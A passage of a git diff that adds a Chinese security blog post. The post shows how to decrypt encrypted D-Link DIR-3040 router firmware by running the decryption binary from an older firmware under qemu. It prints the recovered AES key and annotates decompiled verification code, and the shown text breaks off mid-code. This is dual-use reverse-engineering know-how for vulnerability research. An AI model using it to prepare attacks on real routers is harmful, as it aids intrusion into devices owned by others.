@@ -168,6 +168,216 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/%E5%BA%94%E5%AF%B9%E5%8A%A0%E5%AF%86%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BB%8E%E6%9C%AA%E5%8A%A0%E5%AF%86%E8%80%81%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/12/%E5%BA%94%E5%AF%B9%E5%8A%A0%E5%AF%86%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BB%8E%E6%9C%AA%E5%8A%A0%E5%AF%86%E8%80%81%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86/" class="post-title-link" itemprop="url">应对加密固件之从未加密老固件进行解密</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-04-12 07:17:29 / Modified: 19:20:05" itemprop="dateCreated datePublished" datetime="2023-04-12T07:17:29+08:00">2023-04-12</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="加密固件之依据老固件进行解密"><a href="#加密固件之依据老固件进行解密" class="headerlink" title="加密固件之依据老固件进行解密"></a>加密固件之依据老固件进行解密</h1><p>IoT漏洞分析最为重要的环节之一就是获取固件以及固件中的文件系统。固件获取的方式也五花八门，硬核派有直接将flash拆下来到编程器读取，通过硬件调试器UART&#x2F;SPI、JTAG&#x2F;SWD获取到控制台访问；网络派有中间人攻击拦截OTA升级，从制造商的网页进行下载；社工派有假装研究者（学生）直接向客服索要，上某鱼进行PY。有时候千辛万苦获取到固件了，开开心心地使用<code>binwalk -Me</code>一把梭哈，却发现，固件被加密了，惊不惊喜，刺不刺激。</p>
+<p>如下就是针对如何对加密固件进行解密的其中一个方法：回溯未加密的老固件，从中找到负责对固件进行解密的程序，然后解密最新的加密固件。此处做示范使用的设备是前几天爆出存在漏洞的路由器D-Link DIR 3040 US，固件使用的最新加密版本<a target="_blank" rel="noopener" href="https://support.dlink.com/productinfo.aspx?m=DIR-3040-US">1.13B03</a>，老固件使用的是已经解密固件版本<a target="_blank" rel="noopener" href="https://support.dlink.com/productinfo.aspx?m=DIR-3040-US">1.13B02</a>。</p>
+<h2 id="判断固件是否已经被加密"><a href="#判断固件是否已经被加密" class="headerlink" title="判断固件是否已经被加密"></a>判断固件是否已经被加密</h2><p>一般从官网下载到固件的时候，是先以zip等格式进行了一次压缩的，通常可以先正常解压一波。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tree -L 1</span></span><br><span class="line">.</span><br><span class="line">├── DIR3040A1_FW112B01_middle.bin</span><br><span class="line">├── DIR3040A1_FW113B03.bin</span><br><span class="line">└── DIR-3040_REVA_RELEASE_NOTES_v1.13B03.pdf</span><br></pre></td></tr></table></figure>
+
+<p>使用binwalk查看一下固件的信息，如果是未加密的固件，通常可以扫描出来使用了何种压缩算法。以常见的嵌入式文件系统squash-fs为例，比较常见的有LZMA、LZO、LAMA2这些。如下是使用binwalk分别查看一个未加密固件（netgear）和加密固件（DIR 3040）信息。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk GS108Tv3_GS110TPv3_GS110TPP_V7.0.6.3.bix</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">64            0x40            LZMA compressed data, properties: 0x5D, dictionary size: 67108864 bytes, uncompressed size: -1 bytes</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk DIR3040A1_FW113B03.bin</span> </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>还有一种方式就是查看固件的熵值。熵值是用来衡量不确定性，熵值越大则说明固件越有可能被加密或者压缩了。这个地方说的是被加密或者压缩了，被压缩的情况也是会让熵值变高或者接近1的，如下是使用<code>binwalk -E</code>查看一个未加密固件（RAX200）和加密固件（DIR 3040）。可以看到，RAX200和DIR 3040相对比，不像后者那样直接全部是接近1了。</p>
+<p><img src="/images/image-2023-0412-191809650.png" alt="undifined"></p>
+<p><img src="/images/image-2023-0412-191825028.png" alt="undifined"></p>
+<h2 id="找到负责解密的可执行文件"><a href="#找到负责解密的可执行文件" class="headerlink" title="找到负责解密的可执行文件"></a>找到负责解密的可执行文件</h2><p>接下来是进入正轨了。首先是寻找到老固件中负责解密的可执行文件。基本逻辑是先从HTML文件中找到显示升级的页面，然后在服务器程序例如此处使用的是lighttpd中去找到何处进行了调用可执行文件下载新固件、解密新固件，这一步也可能是发生在调用的CGI中。</p>
+<p>使用find命令定位和升级相关的页面。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*htm*&quot;</span> | grep -i <span class="string">&quot;firmware&quot;</span></span></span><br><span class="line">./etc_ro/lighttpd/www/web/MobileUpdateFirmware.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware_e.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware_Multi.html</span><br><span class="line">./etc_ro/lighttpd/www/web/UpdateFirmware_Simple.html</span><br></pre></td></tr></table></figure>
+
+<p>然后现在后端lighttpd中去找相关字符串，似乎没有结果呢，那么猜测可能发生在CGI中。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*httpd*&quot;</span> | xargs strings | grep <span class="string">&quot;firm&quot;</span></span></span><br><span class="line">strings: Warning: &#x27;./etc_ro/lighttpd&#x27; is a directory</span><br></pre></td></tr></table></figure>
+
+<p>从CGI程序中查找，似乎运气不错，，，直接就定位到了，结果过多就只展示了最有可能的结果。Bingo！似乎已经得到了解密固件的程序，img、decrypt。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find . -name <span class="string">&quot;*cgi*&quot;</span> | xargs strings | grep -i <span class="string">&quot;firm&quot;</span></span></span><br><span class="line">/bin/imgdecrypt /tmp/firmware.img</span><br></pre></td></tr></table></figure>
+
+<h2 id="仿真并解密固件"><a href="#仿真并解密固件" class="headerlink" title="仿真并解密固件"></a>仿真并解密固件</h2><p>拿到了解密程序，也知道解密程序是怎么输入参数运行的，这个时候可以尝试对直接使用qemu模拟解密程序跑起来，直接对固件进行解密。最好保持解密可执行文件在老版本固件文件系统的位置不变，因为不确定是否使用相对或者绝对路径引用了什么文件，例如解密公私钥。</p>
+<p>先查看可执行文件的运行架构，然后选择对应qemu进行模拟。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file bin/imgdecrypt</span></span><br><span class="line">bin/imgdecrypt: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) ./usr/bin</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount -t proc /proc proc/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount --rbind /sys sys/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount --rbind /dev/ dev/</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . qemu-mipsel-static /bin/sh</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BusyBox v1.22.1 (2020-05-09 10:44:01 CST) built-in shell (ash)</span><br><span class="line">Enter &#x27;help&#x27; for a list of built-in commands.</span><br><span class="line"></span><br><span class="line">/ # /bin/imgdecrypt tmp/DIR3040A1_FW113B03.bin</span><br><span class="line">key:C05FBF1936C99429CE2A0781F08D6AD8</span><br><span class="line">/ # ls -a tmp/</span><br><span class="line">..                      .firmware.orig          .                       DIR3040A1_FW113B03.bin</span><br><span class="line">/ #</span><br></pre></td></tr></table></figure>
+
+<p>那么就解压出来了，解压到了tmp文件夹中，.firmware.orig文件。这个时候使用binwalk再次进行查看，可以看到已经被成功解密了。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk .firmware.orig</span></span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             uImage header, header size: 64 bytes, header CRC: 0x7EA490A0, created: 2020-08-14 10:42:39, image size: 17648005 bytes, Data Address: 0x81001000, Entry Point: 0x81637600, data CRC: 0xAEF2B79F, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: &quot;Linux Kernel Image&quot;</span><br><span class="line">160           0xA0            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 23083456 bytes</span><br><span class="line">1810550       0x1BA076        PGP RSA encrypted session key - keyid: 12A6E329 67B9887A RSA (Encrypt or Sign) 1024b</span><br><span class="line">14275307      0xD9D2EB        Cisco IOS microcode, for &quot;z&quot;</span><br></pre></td></tr></table></figure>
+
+<h2 id="加解密逻辑分析（重点）"><a href="#加解密逻辑分析（重点）" class="headerlink" title="加解密逻辑分析（重点）"></a>加解密逻辑分析（重点）</h2><h3 id="关于固件安全开发到发布的一般流程"><a href="#关于固件安全开发到发布的一般流程" class="headerlink" title="关于固件安全开发到发布的一般流程"></a>关于固件安全开发到发布的一般流程</h3><p>如果要考虑到固件的安全性，需要解决的一些痛点基本上是：</p>
+<ul>
+<li>机密性：通过类似官网的公开渠道获取到解密后的固件</li>
+<li>完整性：攻击者劫持升级渠道，或者直接将修改后的固件上传到设备，使固件升级</li>
+</ul>
+<p>对于机密性，从固件的源头、传输渠道到设备三个点来分析。首先在源头，官网上或者官方TFP可以提供已经被加密的固件，设备自动或手动检查更新并从源头下载，下载到设备上后进行解密。其次是渠道，可以采用类似于HTTPS的加密传输方式来对固件进行传输。但是前面两种方式终归是要将固件下载到设备中。</p>
+<p>如果是进行简单的加密，很常见的一种方式，尤其是对于一些低端嵌入式固件，通常使用了硬编码的对称加密方式，例如AES、DES之类的，还可以基于硬编码的字符串进行一些数据计算，然后作为解密密钥。这次分析的DIR 3040就是采用的这种方式。</p>
+<p>对于完整性，开发者在一开始可以通过基于自签名证书来实现对固件完整性的校验。开发者使用私钥对固件进行签名，并把签名附加到固件中。设备在接受安装时使用提前预装的公钥进行验证，如果检测到设备完整性受损，那么就拒绝固件升级。签名的流程一般不直接对固件本身的内容进行签名，首先计算固件的HASH值，然后开发者使用私钥对固件HASH进行签名，将签名附加到固件中。设备在出厂时文件系统中就被预装了公钥，升级通过公钥验证签名是否正确。</p>
+<p><img src="/images/image-2023-0412-191853123.png" alt="undifined"></p>
+<h3 id="加解密逻辑分析"><a href="#加解密逻辑分析" class="headerlink" title="加解密逻辑分析"></a>加解密逻辑分析</h3><p>既然到这个地方了，那么顺便进去看一看解密程序是如何进行运作的。从IDA的符号表中可以看到，使用到了对称加密AES、非对称加密RSA和哈希SHA512，是不是对比上面提到的固件安全开发到发布的流程，心中大概有个数了。</p>
+<p>首先我们进入main函数，可以知道，这个解密程序imgdecrypt实际上也是具有加密功能的。这里提一下，因为想要把整个解密固件的逻辑都撸一撸，可能会在文章里面贴出很多的具体函数分析，那么文章篇幅就会有点长，不过最后会进行一个流程的小总结，希望看的师傅不用觉得啰嗦。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(*argv, <span class="string">&quot;decrypt&quot;</span>, envp) )</span><br><span class="line">    result = decrypt_firmare(argc, (<span class="type">int</span>)argv);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = encrypt_firmare(argc, argv);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下一步继续进入到函数decrypt_firmare中，这个地方结合之前仿真可以知道：argc&#x3D;2，argv&#x3D;参数字符串地址。首先是进行一些参数的初始化，例如aes_key、公钥的存储地址pubkey_loc。</p>
+<p>接下来是对输入参数数量和参数字符串的判定，输入参数数量从2开始判定，结合之前的仿真，那么argc&#x3D;2，第一个是程序名，第二个是已加密固件地址。</p>
+<p>然后在004021AC地址处的函数check_rsa_cert，该函数内部逻辑也非常简单，基本就是调用RSA相关的库函数，读取公钥并判定公钥是否有效，有效则将读取到的RSA对象保存在dword_413220。检查成功后，就进入到004025A4地址处的函数aes_cbc_crypt中。这个函数的主要作用就是根据一个固定字符串0123456789ABCDEF生成密钥，是根据硬编码生成的解密密钥，因此每次生成并打印出来的密钥是相同的，此处密钥用变量aes_key表示。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">decrypt_firmare</span><span class="params">(<span class="type">int</span> argc, <span class="type">int</span> argv)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *pubkey_loc; <span class="comment">// [sp+18h] [-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+1Ch] [-18h]</span></span><br><span class="line">  <span class="type">int</span> aes_key[<span class="number">5</span>]; <span class="comment">// [sp+20h] [-14h] BYREF</span></span><br><span class="line"></span><br><span class="line">  qmemcpy(aes_key, <span class="string">&quot;0123456789ABCDEF&quot;</span>, <span class="number">16</span>);</span><br><span class="line">  pubkey_loc = <span class="string">&quot;/etc_ro/public.pem&quot;</span>;</span><br><span class="line">  i = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt;= <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( argc &gt;= <span class="number">3</span> )</span><br><span class="line">      pubkey_loc = *(<span class="type">const</span> <span class="type">char</span> **)(argv + <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> ( check_rsa_cert((<span class="type">int</span>)pubkey_loc, <span class="number">0</span>) )   <span class="comment">// 读取公钥并进行保存RSA对象到dword_413220中</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      aes_cbc_crypt((<span class="type">int</span>)aes_key);              <span class="comment">// 生成aes_key</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;key:&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; ++i )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, *((<span class="type">unsigned</span> __int8 *)aes_key + i));<span class="comment">// 打印出key</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">      i = actual_decrypt(*(_DWORD *)(argv + <span class="number">4</span>), (<span class="type">int</span>)<span class="string">&quot;/tmp/.firmware.orig&quot;</span>, (<span class="type">int</span>)aes_key);</span><br><span class="line">      <span class="keyword">if</span> ( !i )</span><br><span class="line">      &#123;</span><br><span class="line">        unlink(*(_DWORD *)(argv + <span class="number">4</span>));</span><br><span class="line">        rename(<span class="string">&quot;/tmp/.firmware.orig&quot;</span>, *(_DWORD *)(argv + <span class="number">4</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      RSA_free(dword_413220);</span><br><span class="line">      result = i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;sourceFile&gt;\r\n&quot;</span>, *(<span class="type">const</span> <span class="type">char</span> **)argv);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是真正的负责解密和验证固件的函数actual_decrypt，位于地址00401770处。在分析这个函数的时候，我发现IDA的MIPS32在反编译处理函数的输入参数的时候，似乎会把数值给弄错了，，，比如fun(a + 10)，可能会反编译成fun(a + 12)。已经修正过函数参数数值的反编译代码就放在下面，代码分析也全部直接放在注释中了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">actual_decrypt</span><span class="params">(<span class="type">int</span> img_loc, <span class="type">int</span> out_image_loc, <span class="type">int</span> aes_key)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> image_fp; <span class="comment">// [sp+20h] [-108h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [sp+24h] [-104h]</span></span><br><span class="line">  _DWORD *MEM; <span class="comment">// [sp+28h] [-100h]</span></span><br><span class="line">  <span class="type">int</span> OUT_MEM; <span class="comment">// [sp+2Ch] [-FCh]</span></span><br><span class="line">  <span class="type">int</span> file_blocks; <span class="comment">// [sp+30h] [-F8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [sp+34h] [-F4h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+38h] [-F0h]</span></span><br><span class="line">  <span class="type">int</span> out_image_fp; <span class="comment">// [sp+3Ch] [-ECh]</span></span><br><span class="line">  <span class="type">int</span> data1_len; <span class="comment">// [sp+40h] [-E8h]</span></span><br><span class="line">  <span class="type">int</span> data2_len; <span class="comment">// [sp+44h] [-E4h]</span></span><br><span class="line">  _DWORD *IN_MEM; <span class="comment">// [sp+48h] [-E0h]</span></span><br><span class="line">  <span class="type">char</span> hash_buf[<span class="number">68</span>]; <span class="comment">// [sp+4Ch] [-DCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> image_info[<span class="number">38</span>]; <span class="comment">// [sp+90h] [-98h] BYREF</span></span><br><span class="line"></span><br><span class="line">  image_fp = <span class="number">-1</span>;</span><br><span class="line">  out_image_fp = <span class="number">-1</span>;</span><br><span class="line">  v5 = <span class="number">-1</span>;</span><br><span class="line">  MEM = <span class="number">0</span>;</span><br><span class="line">  OUT_MEM = <span class="number">0</span>;</span><br><span class="line">  file_blocks = <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// 这个hashbuf用于存储SHA512的计算结果，在后面比较会一直被使用到</span></span><br><span class="line">  <span class="built_in">memset</span>(hash_buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  data1_len = <span class="number">0</span>;</span><br><span class="line">  data2_len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(image_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(image_info));</span><br><span class="line">  IN_MEM = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 通过stat函数读取加密固件的相关信息写入结构体到image_info，最重要的是文件大小</span></span><br><span class="line">  <span class="keyword">if</span> ( !stat(img_loc, image_info) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取文件大小</span></span><br><span class="line">    file_blocks = image_info[<span class="number">13</span>];</span><br><span class="line">    <span class="comment">// 以只读打开加密固件</span></span><br><span class="line">    image_fp = open(img_loc, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 将加密固件映射到内存中</span></span><br><span class="line">      MEM = (_DWORD *)mmap(<span class="number">0</span>, file_blocks, <span class="number">1</span>, <span class="number">1</span>, image_fp, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( MEM )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 以O_RDWR | O_NOCTTY获得解密后固件应该存放的文件描述符</span></span><br><span class="line">        out_image_fp = open(out_image_loc, <span class="number">258</span>);</span><br><span class="line">        <span class="keyword">if</span> ( out_image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = file_blocks;</span><br><span class="line">          <span class="comment">// 比较写入到内存的大小和固件的真实大小是否相同</span></span><br><span class="line">          <span class="keyword">if</span> ( file_blocks - <span class="number">1</span> == lseek(out_image_fp, file_blocks - <span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            write(out_image_fp, &amp;unk_402EDC, <span class="number">1</span>);</span><br><span class="line">            close(out_image_fp);</span><br><span class="line">            out_image_fp = open(out_image_loc, <span class="number">258</span>);</span><br><span class="line">            <span class="comment">// 以加密固件的文件大小，将待解密的固件映射到内存中，返回内存地址OUT_MEM</span></span><br><span class="line">            OUT_MEM = mmap(<span class="number">0</span>, v9, <span class="number">3</span>, <span class="number">1</span>, out_image_fp, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( OUT_MEM )</span><br><span class="line">            &#123;</span><br><span class="line">              IN_MEM = MEM;                     <span class="comment">// 重新赋值指针</span></span><br><span class="line">              <span class="comment">// 检查固件的Magic，通过查看HEX可以看到加密固件的开头有SHRS魔数</span></span><br><span class="line">              <span class="keyword">if</span> ( check_magic((<span class="type">int</span>)MEM) )      <span class="comment">// 比较读取到的固件信息中含有SHRS</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">// 获得解密后固件的大小</span></span><br><span class="line">                data1_len = htonl(IN_MEM[<span class="number">2</span>]);  </span><br><span class="line">                data2_len = htonl(IN_MEM[<span class="number">1</span>]);	</span><br><span class="line">                <span class="comment">// 从加密固件的1756地址起，计算data1_len个字节的SHA512，也就是解密后固件大小的消息摘要，并保存到hash_buf</span></span><br><span 